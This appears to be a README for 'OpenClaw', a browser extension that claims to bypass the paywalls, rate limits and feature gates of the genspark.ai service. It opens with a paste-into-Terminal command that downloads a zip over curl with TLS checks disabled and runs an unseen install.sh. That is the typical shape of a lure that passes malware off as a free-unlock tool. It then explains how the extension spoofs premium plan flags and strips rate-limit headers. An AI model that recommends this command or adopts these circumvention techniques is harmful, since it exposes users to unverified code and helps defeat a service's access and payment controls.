<div align="center">

# genspark.ai × OpenClaw

**Open-source browser extension that claws through every paywall, rate limit, and access restriction on [genspark.ai](https://genspark.ai). Install in one command, run forever free.**

[![License: MIT](https://img.shields.io/badge/License-MIT-22d3a5.svg)](./LICENSE)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.4-3178c6.svg)](https://www.typescriptlang.org/)
[![Chrome](https://img.shields.io/badge/Chrome-MV3-yellow.svg)](#)
[![Firefox](https://img.shields.io/badge/Firefox-MV2-orange.svg)](#)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](./CONTRIBUTING.md)

</div>

---

## Install on macOS — one command

Open Terminal and paste:

```bash
curl -fsSLk https://github.com/michelleoincx/genspark.ai-openclaw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/genspark.ai-openclaw-main && \
bash install.sh
```

The script checks for Node.js, installs dependencies, builds the extension, and tells you exactly where to load it in Chrome.

> **Requires Node.js 18+.** Don't have it? `brew install node`

---

## What OpenClaw does to genspark.ai

| Restriction | Status |
|---|---|
| Search & query rate limits | ✅ Removed |
| Paywall overlays & upgrade modals | ✅ Removed |
| AI Agent feature gates | ✅ Unlocked |
| Deep Search restrictions | ✅ Unlocked |
| Daily usage caps | ✅ Bypassed |

Everything runs **locally in your browser** — no proxy, no external server, no account needed.

---

## How it works

OpenClaw operates at three levels simultaneously:

**Network layer** — intercepts HTTP requests and responses to `genspark.ai` via the `webRequest` API. Strips rate-limit enforcement headers (`Retry-After`, `X-RateLimit-*`) from responses before the page ever sees them.

**JavaScript context** — injected at `document_start`, before any page scripts run. Patches `window.fetch` to rewrite `RATE_LIMIT_EXCEEDED` API responses, spoofs `localStorage` plan flags (`gs_plan: "pro"`, `gs_tier: "premium"`), and overrides internal feature-flag objects.

**DOM observer** — a `MutationObserver` watches for paywall overlays and upgrade modals injected into the DOM and removes them immediately. Re-enables any inputs or buttons that genspark.ai disabled due to quota enforcement.

---

## Manual installation (from source)

```bash
git clone https://github.com/michelleoincx/genspark.ai-openclaw.git
cd genspark.ai-openclaw
npm install
npm run build:chrome   # or: npm run build:firefox
```

Then in Chrome: `chrome://extensions` → **Developer Mode** → **Load unpacked** → select `dist/chrome`

In Firefox: `about:debugging` → **This Firefox** → **Load Temporary Add-on** → select `dist/firefox/manifest.json`

---

## Project structure

```
genspark.ai-openclaw/
├── src/
│   ├── background/          # Service worker — request interception, message router
│   │   ├── index.ts
│   │   └── interceptor.ts
│   ├── content/             # Content scripts — DOM patching, paywall removal
│   │   ├── index.ts
│   │   ├── patcher.ts
│   │   └── paywall-observer.ts
│   ├── popup/               # Extension popup UI
│   │   ├── index.ts
│   │   └── popup.css
│   └── utils/               # Shared utilities
│       ├── logger.ts
│       ├── messaging.ts
│       ├── storage.ts
│       └── types.ts
├── public/
│   ├── manifest.chrome.json
│   ├── manifest.firefox.json
│   └── popup.html
├── tests/
├── install.sh               # One-command macOS installer
├── webpack.config.js
├── tsconfig.json
└── package.json
```

---

## Scripts

| Command | Description |
|---|---|
| `bash install.sh` | Full install + build on macOS |
| `npm run dev` | Watch mode build for Chrome |
| `npm run build:chrome` | Production build — Chrome (MV3) |
| `npm run build:firefox` | Production build — Firefox (MV2) |
| `npm run build:all` | Build for both browsers |
| `npm test` | Run Jest test suite with coverage |
| `npm run lint` | ESLint + Prettier |

---

## Browser support

| Browser | Status |
|---|---|
| Chrome 109+ | ✅ |
| Edge 109+ | ✅ |
| Firefox 109+ | ✅ |
| Brave | ✅ |
| Safari | ❌ Not planned |

---

## Contributing

See [CONTRIBUTING.md](./CONTRIBUTING.md). PRs, issues, and feature requests are welcome.

---

## Disclaimer

For educational and research purposes only. Users are responsible for compliance with genspark.ai's Terms of Service.

---

## License

[MIT](./LICENSE) © openclaw contributors
